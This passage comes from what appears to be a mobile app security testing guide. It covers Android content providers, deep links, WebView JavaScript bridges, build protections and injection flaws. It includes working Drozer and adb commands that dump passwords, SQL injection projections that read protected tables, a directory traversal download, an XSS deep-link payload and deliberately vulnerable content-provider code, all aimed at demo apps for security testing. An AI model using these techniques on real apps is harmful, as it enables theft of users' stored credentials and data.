android:authorities="com.mwr.example.sieve.FileBackupProvider" android:exported="true" android:multiprocess="true" android:name=".FileBackupProvider" /> AsshownintheAndroidManifest.xmlabove,theapplicationexportstwocontentproviders. Notethatonepath(“/Keys”) isprotectedbyreadandwritepermissions. Inspect the source code InspectthequeryfunctionintheDBContentProvider.javafiletodeterminewhetheranysensitiveinformationisbeing leaked: ExampleinJava: public Cursor query(final Uriuri,final String[]array,final Strings,final String[]array2,final Strings2){ final intmatch =this.sUriMatcher.match(uri); final SQLiteQueryBuildersqLiteQueryBuilder =newSQLiteQueryBuilder(); if(match >=100&& match <200){ sqLiteQueryBuilder.setTables("Passwords"); } else if(match >=200){ sqLiteQueryBuilder.setTables("Key"); } return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(),array,s,array2,(String)null,(String)null,s2); } 277\nExampleinKotlin: funquery(uri:Uri?,array:Array<String?>?,s:String?,array2:Array<String?>?,s2:String?):Cursor { valmatch:Int=this.sUriMatcher.match(uri) valsqLiteQueryBuilder =SQLiteQueryBuilder() if(match >=100&& match <200){ sqLiteQueryBuilder.tables ="Passwords" }else if(match >=200){ sqLiteQueryBuilder.tables ="Key" } return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(),array,s,array2,null asString?,null asString?,s2) } Here we see that there are actually two paths, “/Keys” and “/Passwords”, and the latter is not being protected in the manifestandisthereforevulnerable. WhenaccessingaURI,thequerystatementreturnsallpasswordsandthepathPasswords/. Wewilladdressthisinthe “DynamicAnalysis”sectionandshowtheexactURIthatisrequired. Dynamic Analysis Testing Content Providers To dynamically analyze an application’s content providers, first enumerate the attack surface: pass the app’s package nametotheDrozermoduleapp.provider.info: dz>runapp.provider.info -acom.mwr.example.sieve Package:com.mwr.example.sieve Authority:com.mwr.example.sieve.DBContentProvider ReadPermission:null WritePermission:null ContentProvider:com.mwr.example.sieve.DBContentProvider MultiprocessAllowed:True GrantUriPermissions:False PathPermissions: Path:/Keys Type:PATTERN_LITERAL ReadPermission:com.mwr.example.sieve.READ_KEYS WritePermission:com.mwr.example.sieve.WRITE_KEYS Authority:com.mwr.example.sieve.FileBackupProvider ReadPermission:null WritePermission:null ContentProvider:com.mwr.example.sieve.FileBackupProvider MultiprocessAllowed:True GrantUriPermissions:False Inthisexample,twocontentprovidersareexported. Bothcanbeaccessedwithoutpermission,exceptforthe/Keyspath intheDBContentProvider. Withthisinformation,youcanreconstructpartofthecontentURIstoaccesstheDBContent- Provider(theURIsbeginwithcontent://). ToidentifycontentproviderURIswithintheapplication,useDrozer’sscanner.provider.findurismodule. Thismodule guessespathsanddeterminesaccessiblecontentURIsinseveralways: dz>runscanner.provider.finduris -acom.mwr.example.sieve Scanningcom.mwr.example.sieve... UnabletoQuerycontent://com.mwr.example.sieve.DBContentProvider/ ... UnabletoQuerycontent://com.mwr.example.sieve.DBContentProvider/Keys AccessiblecontentURIs: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ Onceyouhavealistofaccessiblecontentproviders,trytoextractdatafromeachproviderwiththeapp.provider.query module: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical _id:1 service:Email username:incognitoguy50 password:PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64 -encoded) email:incognitoguy50@gmail.com YoucanalsouseDrozertoinsert,update,anddeleterecordsfromavulnerablecontentprovider: 278\n• Insertrecord dz>runapp.provider.insert content://com.vulnerable.im/messages --stringdate 1331763850325 --stringtype 0 --integer_id 7 • Updaterecord dz>runapp.provider.update content://settings/secure --selection "name=?" --selection-argsassisted_gps_enabled --integervalue 0 • Deleterecord dz>runapp.provider.delete content://settings/secure --selection "name=?" --selection-argsmy_setting SQL Injection in Content Providers TheAndroidplatformpromotesSQLitedatabasesforstoringuserdata. BecausethesedatabasesarebasedonSQL,they may be vulnerable to SQL injection. You can use the Drozer module app.provider.query to test for SQL injection by manipulatingtheprojectionandselectionfieldsthatarepassedtothecontentprovider: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--projection"'" unrecognizedtoken:"'FROMPasswords"(code1):,whilecompiling:SELECT'FROMPasswords dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--selection"'" unrecognizedtoken:"')"(code1):,whilecompiling:SELECT*FROMPasswordsWHERE(') If an application is vulnerable to SQL Injection, it will return a verbose error message. SQL Injection on Android may be used to modify or query data from the vulnerable content provider. In the following example, the Drozer module app.provider.queryisusedtolistallthedatabasetables: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--projection"* FROMSQLITE_MASTERWHEREtype='table';--" |type |name |tbl_name |rootpage|sql | |table|android_metadata|android_metadata|3 |CREATETABLE...| |table|Passwords |Passwords |4 |CREATETABLE...| |table|Key |Key |5 |CREATETABLE...| SQLInjectionmayalsobeusedtoretrievedatafromotherwiseprotectedtables: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--projection"*FROMKey;--" |Password|pin| |thisismypassword|9876| You can automate these steps with the scanner.provider.injection module, which automatically finds vulnerable contentproviderswithinanapp: dz>runscanner.provider.injection-acom.mwr.example.sieve Scanningcom.mwr.example.sieve... InjectioninProjection: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ InjectioninSelection: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ File System Based Content Providers Contentproviderscanprovideaccesstotheunderlyingfilesystem. Thisallowsappstosharefiles(theAndroidsandbox normallypreventsthis). YoucanusetheDrozermodulesapp.provider.readandapp.provider.downloadtoreadand download files, respectively, from exported file-based content providers. These content providers are susceptible to directorytraversal,whichallowsotherwiseprotectedfilesinthetargetapplication’ssandboxtoberead. 279\ndz>runapp.provider.downloadcontent://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db/home/user/database.db Written24488bytes Usethescanner.provider.traversalmoduletoautomatetheprocessoffindingcontentprovidersthataresusceptible todirectorytraversal: dz>runscanner.provider.traversal-acom.mwr.example.sieve Scanningcom.mwr.example.sieve... VulnerableProviders: content://com.mwr.example.sieve.FileBackupProvider/ content://com.mwr.example.sieve.FileBackupProvider Notethatadbcanalsobeusedtoquerycontentproviders: $adbshellcontentquery --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials Row:0id=1,username=admin,password=StrongPwd Row:1id=2,username=test,password=test ... Testing Deep Links Platform: android MASVSV1: MSTG-PLATFORM-3 MASVSV2: MASVS-PLATFORM-1 Overview Any existing deep links (including App Links) can potentially increase the app attack surface. Thisincludes many risks suchaslinkhijacking,sensitivefunctionalityexposure,etc. • Before Android 12 (API level 31), if the app has any non-verifiable links, it can cause the system to not verify all AndroidAppLinksforthatapp. • StartingonAndroid12(APIlevel31), appsbenefitfromareducedattacksurface. Agenericwebintentresolves totheuser’sdefaultbrowserappunlessthetargetappisapprovedforthespecificdomaincontainedinthatweb intent. Alldeeplinksmustbeenumeratedandverifiedforcorrectwebsiteassociation. Theactionstheyperformmustbewell tested,especiallyallinputdata,whichshouldbedeemeduntrustworthyandthusshouldalwaysbevalidated. Noneoftheinputfromthesesourcescanbetrusted;itmustbevalidatedand/orsanitized. Validationensuresprocessing ofdatathattheappisexpectingonly. Ifvalidationisnotenforced,anyinputcanbesenttotheapp,whichmayallowan attackerormaliciousapptoexploitappfunctionality. Static Analysis Check for Android OS Version The Android version in which the app runs also influences the risk of using deep links. Inspect the Android Manifest to checkifminSdkVersionis31orhigher. • BeforeAndroid12(APIlevel31),iftheapphasanynon-verifiabledeeplinks,itcancausethesystemtonotverify allAndroidAppLinksforthatapp. • StartingonAndroid12(APIlevel31), appsbenefitfromareducedattacksurface. Agenericwebintentresolves totheuser’sdefaultbrowserappunlessthetargetappisapprovedforthespecificdomaincontainedinthatweb intent. 280\nCheck for Deep Link Usage InspectingtheAndroidManifest: Youcaneasilydeterminewhetherdeeplinks(withorwithoutcustomURLschemes)aredefinedbydecodingtheappusing apktoolandinspectingtheAndroidManifestfilelookingfor<intent-filter>elements. • CustomUrlSchemes: ThefollowingexamplespecifiesadeeplinkwithacustomURLschemecalledmyapp://. <activity android:name=".MyUriActivity"> <intent-filter> <action android:name="android.intent.action.VIEW" /> <category android:name="android.intent.category.DEFAULT" /> <category android:name="android.intent.category.BROWSABLE" /> <data android:scheme="myapp" android:host="path" /> </intent-filter> </activity> • Deep Links: ThefollowingexamplespecifiesadeepLinkusingboththehttp://andhttps://schemes,along withthehostandpaththatwillactivateit(inthiscase, thefullURLwouldbehttps://www.myapp.com/my/app/ path): <intent-filter> ... <data android:scheme="http" android:host="www.myapp.com" android:path="/my/app/path" /> <data android:scheme="https" android:host="www.myapp.com" android:path="/my/app/path" /> </intent-filter> • AppLinks:Ifthe<intent-filter>includestheflagandroid:autoVerify="true",thiscausestheAndroidsystem toreachouttothedeclaredandroid:hostinanattempttoaccesstheDigitalAssetLinksfileinordertoverifythe AppLinks. AdeeplinkcanbeconsideredanAppLinkonlyiftheverificationissuccessful. <intent-filter android:autoVerify="true"> Whenlistingdeeplinksrememberthat<data>elementswithinthesame<intent-filter>areactuallymergedtogether toaccountforallvariationsoftheircombinedattributes. <intent-filter> ... <data android:scheme="https" android:host="www.example.com" /> <data android:scheme="app" android:host="open.my.app" /> </intent-filter> It might seem as though this supports only https://www.example.com and app://open.my.app. However, it actually supports: • https://www.example.com • app://open.my.app • app://www.example.com • https://open.my.app UsingDumpsys: Useadbtorunthefollowingcommandthatwillshowallschemes: adbshelldumpsyspackagecom.example.package UsingAndroid“AppLinkVerification”Tester: UsetheAndroid“AppLinkVerification”Testerscripttolistalldeeplinks(list-all)oronlyapplinks(list-applinks): python3deeplink_analyser.py -oplist-all -apk ~/Downloads/example.apk .MainActivity app://open.my.app app://www.example.com https://open.my.app https://www.example.com 281\nCheck for Correct Website Association Evenifdeeplinkscontaintheandroid:autoVerify="true"attribute,theymustbeactuallyverifiedinordertobecon- sideredAppLinks. Youshouldtestforanypossiblemisconfigurationsthatmightpreventfullverification. Automatic Verification UsetheAndroid“AppLinkVerification”Testerscripttogettheverificationstatusforallapplinks(verify-applinks). See anexamplehere. OnlyonAndroid12(APIlevel31)orhigher: YoucanuseadbtotesttheverificationlogicregardlessofwhethertheapptargetsAndroid12(APIlevel31)ornot. This featureallowsyouto: • invoketheverificationprocessmanually. • resetthestateofthetargetapp’sAndroidAppLinksonyourdevice. • invokethedomainverificationprocess. Youcanalsoreviewtheverificationresults. Forexample: adbshellpmget-app-linkscom.example.package com.example.package: ID:01234567-89ab-cdef-0123-456789abcdef Signatures: [***] Domainverificationstate: example.com:verified sub.example.com:legacy_failure example.net:verified example.org:1026 Thesameinformationcanbefoundbyrunningadbshelldumpsyspackagecom.example.package(onlyonAndroid 12(APIlevel31)orhigher). Manual Verification Thissectiondetailsafew,ofpotentiallymany,reasonswhytheverificationprocessfailedorwasnotactuallytriggered. See more information in the Android Developers Documentation and in the white paper “Measuring the Insecurity of MobileDeepLinksofAndroid”. ChecktheDigitalAssetLinksfile: • CheckformissingDigitalAssetLinksfile: – try to find it in the domain’s /.well-known/ path. Example: https://www.example.com/.well-known/ assetlinks.json – or try https://digitalassetlinks.googleapis.com/v1/statements:list?source.web.site=www. example.com • CheckforvalidDigitalAssetLinksfileservedviaHTTP. • CheckforinvalidDigitalAssetLinksfilesservedviaHTTPS.Forexample: – thefilecontainsinvalidJSON. – thefiledoesn’tincludethetargetapp’spackage. CheckforRedirects: Toenhancetheappsecurity,thesystemdoesn’tverifyanyAndroidAppLinksforanappiftheserversetsaredirectsuch ashttp://example.comtohttps://example.comorexample.comtowww.example.com. CheckforSubdomains: If an intent filter lists multiple hosts with different subdomains, there must be a valid Digital Asset Links file on each domain. Forexample,thefollowingintentfilterincludeswww.example.comandmobile.example.comasacceptedintent URLhosts. 282\n<application> <activity android:name=”MainActivity”> <intent-filter android:autoVerify="true"> <action android:name="android.intent.action.VIEW" /> <category android:name="android.intent.category.DEFAULT" /> <category android:name="android.intent.category.BROWSABLE" /> <data android:scheme="https" /> <data android:scheme="https" /> <data android:host="www.example.com" /> <data android:host="mobile.example.com" /> </intent-filter> </activity> </application> Inorderforthedeeplinkstocorrectlyregister,avalidDigitalAssetLinksfilemustbepublishedatbothhttps://www. example.com/.well-known/assetlinks.jsonandhttps://mobile.example.com/.well-known/assetlinks.json. CheckforWildcards: Ifthehostnameincludesawildcard(suchas*.example.com),youshouldbeabletofindavalidDigitalAssetLinksfileat theroothostname: https://example.com/.well-known/assetlinks.json. Check the Handler Method Even if the deep link is correctly verified, the logic of the handler method should be carefully analyzed. Pay special attentiontodeeplinksbeingusedtotransmitdata(whichiscontrolledexternallybytheuseroranyotherapp). First,obtainthenameoftheActivityfromtheAndroidManifest<activity>elementwhichdefinesthetarget<intent- filter>andsearchforusageofgetIntentandgetData. Thisgeneralapproachoflocatingthesemethodscanbeused acrossmostapplicationswhenperformingreverseengineeringandiskeywhentryingtounderstandhowtheapplication usesdeeplinksandhandlesanyexternallyprovidedinputdataandifitcouldbesubjecttoanykindofabuse. ThefollowingexampleisasnippetfromanexemplaryKotlinappdecompiledwithjadx. Fromthestaticanalysisweknow thatitsupportsthedeeplinkdeeplinkdemo://load.html/aspartofcom.mstg.deeplinkdemo.WebViewActivity. //snippeteditedforsimplicity public final class WebViewActivity extends AppCompatActivity { private ActivityWebViewBindingbinding; public void onCreate(BundlesavedInstanceState){ Uridata =getIntent().getData(); Stringhtml =data ==null ?null :data.getQueryParameter("html"); Uridata2 =getIntent().getData(); Stringdeeplink_url =data2 ==null ?null :data2.getQueryParameter("url"); ViewfindViewById =findViewById(R.id.webView); if(findViewById !=null){ WebViewwv =(WebView)findViewById; wv.getSettings().setJavaScriptEnabled(true); if(deeplink_url !=null){ wv.loadUrl(deeplink_url); ... You can simply follow the deeplink_url String variable and see the result from the wv.loadUrl call. This means the attackerhasfullcontroloftheURLbeingloadedtotheWebView(asshownabovehasJavaScriptenabled. ThesameWebViewmightbealsorenderinganattackercontrolledparameter. Inthatcase,thefollowingdeeplinkpayload wouldtriggerReflectedCross-SiteScripting(XSS)withinthecontextoftheWebView: deeplinkdemo://load.html?attacker_controlled=<svgonload=alert(1)> Buttherearemanyotherpossibilities. Besuretocheckthefollowingsectionstolearnmoreaboutwhattoexpectand howtotestdifferentscenarios: • “Cross-SiteScriptingFlaws”. • “InjectionFlaws”. • “TestingObjectPersistence”. • “TestingforURLLoadinginWebViews” • “TestingJavaScriptExecutioninWebViews” • “TestingWebViewProtocolHandlers” 283\nInaddition,werecommendtosearchandreadpublicreports(searchterm: "deep link*"|"deeplink*" site:https:// hackerone.com/reports/). Forexample: • “[HackerOne#1372667]Abletostealbearertokenfromdeeplink” • “[HackerOne#401793]Insecuredeeplinkleadstosensitiveinformationdisclosure” • “[HackerOne#583987]AndroidappdeeplinkleadstoCSRFinfollowaction” • “[HackerOne#637194]BypassofbiometricssecurityfunctionalityispossibleinAndroidapplication” • “[HackerOne#341908]XSSviaDirectMessagedeeplinks” Dynamic Analysis Here you will use the list of deep links from the static analysis to iterate and determine each handler method and the processeddata,ifany. YouwillfirststartaFridahookandthenbegininvokingthedeeplinks. Thefollowingexampleassumesatargetappthatacceptsthisdeeplink: deeplinkdemo://load.html. However,wedon’t knowthecorrespondinghandlermethodyet,northeparametersitpotentiallyaccepts. [Step1]FridaHooking: Youcanusethescript“AndroidDeepLinkObserver”fromFridaCodeSharetomonitorallinvokeddeeplinkstriggeringa calltoIntent.getData. Youcanalsousethescriptasabasetoincludeyourownmodificationsdependingontheuse case at hand. In this case we included the stack trace in the script since we are interested in the method which calls Intent.getData. [Step2]InvokingDeepLinks: Now you can invoke any of the deep links using adb and the Activity Manager (am) which will send intents within the Androiddevice. Forexample: adbshellamstart -W-aandroid.intent.action.VIEW -d"deeplinkdemo://load.html/?message=ok#part1" Starting:Intent{act=android.intent.action.VIEWdat=deeplinkdemo://load.html/?message=ok} Status:ok LaunchState:WARM Activity:com.mstg.deeplinkdemo/.WebViewActivity TotalTime:210 WaitTime:217 Complete Thismighttriggerthedisambiguationdialogwhenusingthe“http/https”schemaorifotherinstalledappssupport thesamecustomURLschema. Youcanincludethepackagenametomakeitanexplicitintent. Thisinvocationwilllogthefollowing: [*]Intent.getData()wascalled [*]Activity:com.mstg.deeplinkdemo.WebViewActivity [*]Action:android.intent.action.VIEW [*]Data -Scheme:deeplinkdemo:// -Host:/load.html -Params:message=ok -Fragment:part1 [*]Stacktrace: android.content.Intent.getData(Intent.java) com.mstg.deeplinkdemo.WebViewActivity.onCreate(WebViewActivity.kt) android.app.Activity.performCreate(Activity.java) ... com.android.internal.os.ZygoteInit.main(ZygoteInit.java) In this case we’ve crafted the deep link including arbitrary parameters (?message=ok) and fragment (#part1). We still don’t know if they are being used. The information above reveals useful information that you can use now to reverse engineertheapp. Seethesection“ChecktheHandlerMethod”tolearnaboutthingsyoushouldconsider. • File: WebViewActivity.kt • Class: com.mstg.deeplinkdemo.WebViewActivity • Method: onCreate 284\nSometimes you can even take advantage of other applications that you know interact with your target app. You can reverse engineer the app, (e.g. to extract all strings and filter those which include the target deep links, deeplinkdemo:///load.htmlinthepreviouscase), orusethemastriggers, whilehookingtheappaspreviously discussed. Testing for Java Objects Exposed Through WebViews Platform: android MASVSV1: MSTG-PLATFORM-7 MASVSV2: MASVS-PLATFORM-2 Overview TotestforJavaobjectsexposedthroughWebViewschecktheappforWebViewshavingJavaScriptenabledanddetermine whethertheWebViewiscreatinganyJavaScriptinterfacesaka. “JavaScriptBridges”. Finally,checkwhetheranattacker couldpotentiallyinjectmaliciousJavaScriptcode. Static Analysis The following example shows how addJavascriptInterface is used to bridge a Java Object and JavaScript in a Web- View: WebViewwebview =newWebView(this); WebSettingswebSettings =webview.getSettings(); webSettings.setJavaScriptEnabled(true); MSTG_ENV_008_JS_InterfacejsInterface =newMSTG_ENV_008_JS_Interface(this); myWebView.addJavascriptInterface(jsInterface,"Android"); myWebView.loadURL("http://example.com/file.html"); setContentView(myWebView); In Android 4.2 (API level 17) and above, an annotation @JavascriptInterface explicitly allows JavaScript to access a Javamethod. public class MSTG_ENV_008_JS_Interface { ContextmContext; /**Instantiatetheinterfaceandsetthecontext */ MSTG_ENV_005_JS_Interface(Contextc){ mContext =c; } @JavascriptInterface public String returnString (){ return "SecretString"; } /**Showatoastfromthewebpage */ @JavascriptInterface public void showToast(Stringtoast){ Toast.makeText(mContext,toast,Toast.LENGTH_SHORT).show(); } } ThisishowyoucancallthemethodreturnStringfromJavaScript,thestring“SecretString”willbestoredinthevariable result: varresult =window.Android.returnString(); WithaccesstotheJavaScriptcode,via,forexample,storedXSSoraMITMattack,anattackercandirectlycalltheexposed Javamethods. IfaddJavascriptInterfaceisnecessary,takethefollowingconsiderations: 285\n• Only JavaScript provided with the APK should be allowed to use the bridges, e.g. by verifying the URL on each bridgedJavamethod(viaWebView.getUrl). • NoJavaScriptshouldbeloadedfromremoteendpoints,e.g.bykeepingpagenavigationwithintheapp’sdomains andopeningallotherdomainsonthedefaultbrowser(e.g.Chrome,Firefox). • Ifnecessaryforlegacyreasons(e.g.havingtosupportolderdevices),atleastsettheminimalAPIlevelto17inthe manifestfileoftheapp(<uses-sdk android:minSdkVersion="17" />). Dynamic Analysis DynamicanalysisoftheappcanshowyouwhichHTMLorJavaScriptfilesareloadedandwhichvulnerabilitiesarepresent. TheprocedureforexploitingthevulnerabilitystartswithproducingaJavaScriptpayloadandinjectingitintothefilethat theappisrequesting. TheinjectioncanbeaccomplishedviaaMITMattackordirectmodificationofthefileifitisstoredin externalstorage. ThewholeprocesscanbeaccomplishedviaDrozerandweasel(MWR’sadvancedexploitationpayload), whichcaninstallafullagent,injectingalimitedagentintoarunningprocessorconnectingareverseshellasaRemote AccessTool(RAT). Afulldescriptionoftheattackisincludedintheblogarticle“WebViewaddJavascriptInterfaceRemoteCodeExecution”. 286\nAndroid Code Quality and Build Settings Overview App Signing AndroidrequiresallAPKstobedigitallysignedwithacertificatebeforetheyareinstalledorrun. Thedigitalsignatureis usedtoverifytheowner’sidentityforapplicationupdates. Thisprocesscanpreventanappfrombeingtamperedwithor modifiedtoincludemaliciouscode. When an APK is signed, a public-key certificate is attached to it. This certificate uniquely associates the APK with the developerandthedeveloper’sprivatekey. Whenanappisbeingbuiltindebugmode,theAndroidSDKsignstheappwith adebugkeycreatedspecificallyfordebuggingpurposes. Anappsignedwithadebugkeyisnotmeanttobedistributed andwon’tbeacceptedinmostappstores,includingtheGooglePlayStore. Thefinalreleasebuildofanappmustbesignedwithavalidreleasekey. InAndroidStudio,theappcanbesignedmanually orviacreationofasigningconfigurationthat’sassignedtothereleasebuildtype. PriorAndroid9(APIlevel28)allappupdatesonAndroidneedtobesignedwiththesamecertificate,soavalidityperiod of25yearsormoreisrecommended. AppspublishedonGooglePlaymustbesignedwithakeythatthathasavalidity periodendingafterOctober22th,2033. ThreeAPKsigningschemesareavailable: • JARsigning(v1scheme), • APKSignatureSchemev2(v2scheme), • APKSignatureSchemev3(v3scheme). Thev2signature,whichissupportedbyAndroid7.0(APIlevel24)andabove,offersimprovedsecurityandperformance compared to v1 scheme. The V3 signature, which is supported by Android 9 (API level 28) and above, gives apps the abilitytochangetheirsigningkeysaspartofanAPKupdate. Thisfunctionalityassurescompatibilityandappscontinuous availabilitybyallowingboththenewandtheoldkeystobeused. Notethatitisonlyavailableviaapksigneratthetime ofwriting. Foreachsigningschemethereleasebuildsshouldalwaysbesignedviaallitspreviousschemesaswell. Third-Party Libraries Androidappsoftenmakeuseofthirdpartylibraries. Thesethirdpartylibrariesacceleratedevelopmentasthedeveloper hastowritelesscodeinordertosolveaproblem. Therearetwocategoriesoflibraries: • Librariesthatarenot(orshouldnot)bepackedwithintheactualproductionapplication,suchasMockitousedfor testingandlibrarieslikeJavaAssistusedtocompilecertainotherlibraries. • Librariesthatarepackedwithintheactualproductionapplication,suchasOkhttp3. Theselibrariescanleadtounwantedside-effects: • Alibrarycancontainavulnerability,whichwillmaketheapplicationvulnerable. Agoodexamplearetheversions ofOKHTTPpriorto2.7.5inwhichTLSchainpollutionwaspossibletobypassSSLpinning. • Alibrarycannolongerbemaintainedorhardlybeused,whichiswhynovulnerabilitiesarereportedand/orfixed. Thiscanleadtohavingbadand/orvulnerablecodeinyourapplicationthroughthelibrary. • Alibrarycanusealicense,suchasLGPL2.1,whichrequirestheapplicationauthortoprovideaccesstothesource code for those who use the application and request insight in its sources. In fact the application should then be allowedtoberedistributedwithmodificationstoitssourcecode. Thiscanendangertheintellectualproperty(IP)of theapplication. Pleasenotethatthisissuecanholdonmultiplelevels: WhenyouusewebviewswithJavaScriptrunninginthewebview, theJavaScriptlibrariescanhavetheseissuesaswell. Thesameholdsforplugins/librariesforCordova,React-nativeand Xamarinapps. 287\nMemory Corruption Bugs AndroidapplicationsrunonaVMwheremostofthememorycorruptionissueshavebeentakencareoff. Thisdoesnot meanthattherearenomemorycorruptionbugs. TakeCVE-2018-9522forinstance,whichisrelatedtoserializationissues usingParcels. Next,innativecode,westillseethesameissuesasweexplainedinthegeneralmemorycorruptionsection. Last,weseememorybugsinsupportingservices,suchaswiththeStagefrightattackasshownatBlackHat. Memoryleaksareoftenanissueaswell. ThiscanhappenforinstancewhenareferencetotheContextobjectispassed aroundtonon-Activityclasses,orwhenyoupassreferencestoActivityclassestoyourhelperclasses. Binary Protection Mechanisms Detectingthepresenceofbinaryprotectionmechanismsheavilydependonthelanguageusedfordevelopingtheappli- cation. Ingeneralallbinariesshouldbetested,whichincludesboththemainappexecutableaswellasalllibraries/dependencies. However,onAndroidwewillfocusonnativelibrariessincethemainexecutablesareconsideredsafeaswewillseenext. AndroidoptimizesitsDalvikbytecodefromtheappDEXfiles(e.g.classes.dex)andgeneratesanewfilecontainingthe nativecode,usuallywithan.odex,.oatextension. ThisAndroidcompiledbinaryiswrappedusingtheELFformatwhich istheformatusedbyLinuxandAndroidtopackageassemblycode. Theapp’sNDKnativelibrariesalsousetheELFformat. • PIE(PositionIndependentExecutable): – SinceAndroid7.0(APIlevel24),PICcompilationisenabledbydefaultforthemainexecutables. – WithAndroid5.0(APIlevel21),supportfornon-PIEenablednativelibrarieswasdroppedandsincethen,PIE isenforcedbythelinker. • Memorymanagement: – Garbage Collection will simply run for the main binaries and there’s nothing to be checked on the binaries themselves. – GarbageCollectiondoesnotapplytoAndroidnativelibraries. Thedeveloperisresponsiblefordoingproper manualmemorymanagement. See“MemoryCorruptionBugs”. • StackSmashingProtection: – AndroidappsgetcompiledtoDalvikbytecodewhichisconsideredmemorysafe(atleastformitigatingbuffer overflows). OtherframeworkssuchasFlutterwillnotcompileusingstackcanariesbecauseofthewaytheir language,inthiscaseDart,mitigatesbufferoverflows. – ItmustbeenabledforAndroidnativelibrariesbutitmightbedifficulttofullydetermineit. ∗ NDKlibrariesshouldhaveitenabledsincethecompilerdoesitbydefault. ∗ OthercustomC/C++librariesmightnothaveitenabled. Learnmore: • Androidexecutableformats • Androidruntime(ART) • AndroidNDK • AndroidlinkerchangesforNDKdevelopers Debuggable Apps Debugging is an essential process for developers to identify and fix errors or bugs in their Android app. By using a debugger, developers can select the device to debug their app on and set breakpoints in their Java, Kotlin, and C/C++ code. Thisallowsthemtoanalyzevariablesandevaluateexpressionsatruntime,whichhelpsthemtoidentifytheroot causeofmanyissues. Bydebuggingtheirapp,developerscanimprovethefunctionalityanduserexperienceoftheirapp, ensuringthatitrunssmoothlywithoutanyerrorsorcrashes. Everydebugger-enabledprocessrunsanextrathreadforhandlingJDWPprotocolpackets. Thisthreadisstartedonlyfor appsthathavetheandroid:debuggable="true"attributeintheApplicationelementwithintheAndroidManifest. 288\nDebugging Symbols Generally,youshouldprovidecompiledcodewithaslittleexplanationaspossible. Somemetadata,suchasdebugging information,linenumbers,anddescriptivefunctionormethodnames,makethebinaryorbytecodeeasierforthereverse engineertounderstand,butthesearen’tneededinareleasebuildandcanthereforebesafelyomittedwithoutimpacting theapp’sfunctionality. To inspect native binaries, use a standard tool like nm or objdump to examine the symbol table. A release build should generally not contain any debugging symbols. If the goal is to obfuscate the library, removing unnecessary dynamic symbolsisalsorecommended. Debugging Code and Error Logging StrictMode StrictModeisadevelopertoolfordetectingviolations, e.g.accidentaldiskornetworkaccessontheapplication’smain thread. Itcanalsobeusedtocheckforgoodcodingpractices,suchasimplementingperformantcode. HereisanexampleofStrictModewithpoliciesenabledfordiskandnetworkaccesstothemainthread: public void onCreate(){ if(DEVELOPER_MODE){ StrictMode.setThreadPolicy(newStrictMode.ThreadPolicy.Builder() .detectDiskReads() .detectDiskWrites() .detectNetwork() //or.detectAll()foralldetectableproblems .penaltyLog() .build()); StrictMode.setVmPolicy(newStrictMode.VmPolicy.Builder() .detectLeakedSqlLiteObjects() .detectLeakedClosableObjects() .penaltyLog() .penaltyDeath() .build()); } super.onCreate(); } Inserting the policy in the if statement with the DEVELOPER_MODE condition is recommended. To disable StrictMode, DEVELOPER_MODEmustbedisabledforthereleasebuild. Exception Handling Exceptions occur when an application gets into an abnormal or error state. Both Java and C++ may throw exceptions. Testingexceptionhandlingisaboutensuringthattheappwillhandleanexceptionandtransitiontoasafestatewithout exposingsensitiveinformationviatheUIortheapp’sloggingmechanisms. Make Sure That Free Security Features Are Activated Platform: android MASVSV1: MSTG-CODE-9 MASVSV2: MASVS-CODE-4 Overview Static Analysis TesttheappnativelibrariestodetermineiftheyhavethePIEandstacksmashingprotectionsenabled. Youcanuseradare2’srabin2togetthebinaryinformation. We’llusetheUnCrackableAppforAndroidLevel4v1.0APK asanexample. 289\nAllnativelibrariesmusthavecanaryandpicbothsettotrue. That’sthecaseforlibnative-lib.so: rabin2 -Ilib/x86_64/libnative-lib.so |grep -E"canary|pic" canary true pic true Butnotforlibtool-checker.so: rabin2 -Ilib/x86_64/libtool-checker.so |grep -E"canary|pic" canary false pic true Inthisexample,libtool-checker.somustberecompiledwithstacksmashingprotectionsupport. Testing for Injection Flaws Platform: android MASVSV1: MSTG-PLATFORM-2 MASVSV2: MASVS-CODE-4 Overview Totestforinjectionflawsyouneedtofirstrelyonothertestsandcheckforfunctionalitythatmighthavebeenexposed: • “TestingDeepLinks” • “TestingforSensitiveFunctionalityExposureThroughIPC” • “TestingforOverlayAttacks” Static Analysis AnexampleofavulnerableIPCmechanismisshownbelow. YoucanuseContentProviderstoaccessdatabaseinformation,andyoucanprobeservicestoseeiftheyreturndata. If dataisnotvalidatedproperly,thecontentprovidermaybepronetoSQLinjectionwhileotherappsareinteractingwith it. SeethefollowingvulnerableimplementationofaContentProvider. <provider android:name=".OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation" android:authorities="sg.vp.owasp_mobile.provider.College"> </provider> The AndroidManifest.xml above defines a content provider that’s exported and therefore available to all other apps. ThequeryfunctionintheOMTG_CODING_003_SQL_Injection_Content_Provider_Implementation.javaclassshouldbe inspected. @Override public Cursor query(Uriuri,String[]projection,Stringselection,String[]selectionArgs,StringsortOrder){ SQLiteQueryBuilderqb =newSQLiteQueryBuilder(); qb.setTables(STUDENTS_TABLE_NAME); switch (uriMatcher.match(uri)){ case STUDENTS: qb.setProjectionMap(STUDENTS_PROJECTION_MAP); break; case STUDENT_ID: //SQLInjectionwhenprovidinganID qb.appendWhere(_ID+"="+uri.getPathSegments().get(1)); Log.e("appendWhere",uri.getPathSegments().get(1).toString()); break; 290\ndefault: throw newIllegalArgumentException("UnknownURI" +uri); } if(sortOrder 